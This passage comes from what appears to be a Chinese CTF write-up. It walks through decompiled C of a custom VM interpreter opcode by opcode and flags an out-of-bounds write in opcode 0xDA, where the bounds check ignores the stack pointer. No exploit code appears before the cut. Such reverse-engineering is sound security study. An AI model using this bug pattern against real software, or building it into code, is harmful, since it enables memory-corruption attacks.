class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里的 s 就是我们的 code，首先这个 HIBYTE 就烦人，一开始对所有的 BYTE 都不理解。这里呢会根据传进去的数据，返回 16 进制数的最高位，也就是说会返回我们写入的 code 第 8 字节，联系上问提到的，顺序取值，只要修改 x, 即令 code 的最高位为 6。&lt;/p&gt;
&lt;p&gt;除去这部分，就是对指令代码的解析，最低字节为操作码，其余为数据。先说明下怎么操作，大部分都是对栈顶中的数据进行操作，（这点我有些不理解，因为这栈顶的数据应该都是 0 啊。）然后操作码大致被分为三类，小于 0x36, 小于 0x54, 大于 0x54&lt;/p&gt;
&lt;p&gt;小于等于 0x36 的这部分&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;switch&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x13&lt;/span&gt;u:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( chance &amp;lt;= &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )                      &lt;span class=&#34;comment&#34;&gt;// 重置code和初始xy位置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       set_code_data();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       sub_E91();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       --chance;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x33&lt;/span&gt;u:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       *(_BYTE *)sRSP ^= BYTE1(s);				&lt;span class=&#34;comment&#34;&gt;//异或&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       rsp_add_1(&lt;span class=&#34;number&#34;&gt;1u&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x12&lt;/span&gt;u:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       *(_BYTE *)sRSP *= BYTE1(s);				&lt;span class=&#34;comment&#34;&gt;//乘法&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       rsp_add_1(&lt;span class=&#34;number&#34;&gt;1u&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code == &lt;span class=&#34;number&#34;&gt;0x36&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   *(_BYTE *)sRSP = sub_CBE();                 &lt;span class=&#34;comment&#34;&gt;// push 1 bytes&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   rsp_add_1(&lt;span class=&#34;number&#34;&gt;1u&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;大于 0x36，小于 0x54 的部分&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code &amp;gt; &lt;span class=&#34;number&#34;&gt;0x36&lt;/span&gt;u )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code == &lt;span class=&#34;number&#34;&gt;0x45&lt;/span&gt; )        &lt;span class=&#34;comment&#34;&gt;// push 4byte&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      *(_BYTE *)sRSP = BYTE1(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      rsp_add_1(&lt;span class=&#34;number&#34;&gt;1u&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      *(_BYTE *)sRSP = BYTE2(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      rsp_add_1(&lt;span class=&#34;number&#34;&gt;1u&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      *(_BYTE *)sRSP = BYTE3(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      rsp_add_1(&lt;span class=&#34;number&#34;&gt;1u&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      *(_BYTE *)sRSP = BYTE4(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      rsp_add_1(&lt;span class=&#34;number&#34;&gt;1u&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code &amp;gt; &lt;span class=&#34;number&#34;&gt;0x45&lt;/span&gt;u )   &lt;span class=&#34;comment&#34;&gt;// BYTEx是对64位code进行拆分,0为最低位&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code == &lt;span class=&#34;number&#34;&gt;73&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (BYTE2(s) &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) + (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)BYTE1(s) &amp;lt;= size_X &amp;amp;&amp;amp; (BYTE4(s) &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) + (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)BYTE3(s) &amp;lt;= size_Y )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          x_temp = (BYTE2(s) &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) + BYTE1(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          y_temp = (BYTE4(s) &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) + BYTE3(s);  &lt;span class=&#34;comment&#34;&gt;// 设置下一个start的位置，相当于jmp&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code == &lt;span class=&#34;number&#34;&gt;0x52&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *(_BYTE *)sRSP += BYTE1(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        rsp_add_1(&lt;span class=&#34;number&#34;&gt;1u&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code == &lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt; &amp;amp;&amp;amp; BYTE1(s) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      *(_BYTE *)sRSP = *(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)sRSP / (__int16)BYTE1(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      rsp_add_1(&lt;span class=&#34;number&#34;&gt;1u&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;大于等于 0x54 的部分&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code == &lt;span class=&#34;number&#34;&gt;0x54&lt;/span&gt; )          &lt;span class=&#34;comment&#34;&gt;// 输出栈顶数据一字节&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#123;%c&amp;#125;&amp;quot;&lt;/span&gt;, (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)*(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)sRSP);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_55;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code &amp;gt; &lt;span class=&#34;number&#34;&gt;0x54&lt;/span&gt;u )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code == &lt;span class=&#34;number&#34;&gt;0xCC&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    pop_(&lt;span class=&#34;number&#34;&gt;1u&lt;/span&gt;);                                 &lt;span class=&#34;comment&#34;&gt;// 数值与初始值相比，大于等于1，现在的数值就减一&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_55;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code &amp;gt; &lt;span class=&#34;number&#34;&gt;0xCC&lt;/span&gt;u )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code != &lt;span class=&#34;number&#34;&gt;0xD0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code &amp;gt; &lt;span class=&#34;number&#34;&gt;0xD0&lt;/span&gt;u )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code == &lt;span class=&#34;number&#34;&gt;0xD1&lt;/span&gt; )  &lt;span class=&#34;comment&#34;&gt;// 结束&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code == &lt;span class=&#34;number&#34;&gt;0xDA&lt;/span&gt; &amp;amp;&amp;amp; *(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *)((&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)&amp;amp;s + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;lt; size_X * size_Y )&lt;span class=&#34;comment&#34;&gt;// 只检查了offset是否大于边界，但是未考虑到rsp,数组越界&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          *(_BYTE *)(sRSP + *(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *)((&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)&amp;amp;s + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)) = BYTE5(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)code == &lt;span class=&#34;number&#34;&gt;0xCD&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        buf = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(BYTE1(s));               &lt;span class=&#34;comment&#34;&gt;// malloc (0xe0)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;content: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        n = read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, buf, BYTE1(s));           &lt;span class=&#34;comment&#34;&gt;// read 0xcd&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( n &amp;gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; *((_BYTE *)buf + n - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) == &lt;span class=&#34;string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          *((_BYTE *)buf + n - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;You say \&amp;quot;%s\&amp;quot;\n&amp;quot;&lt;/span&gt;, (&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)buf);&lt;span class=&#34;comment&#34;&gt;// 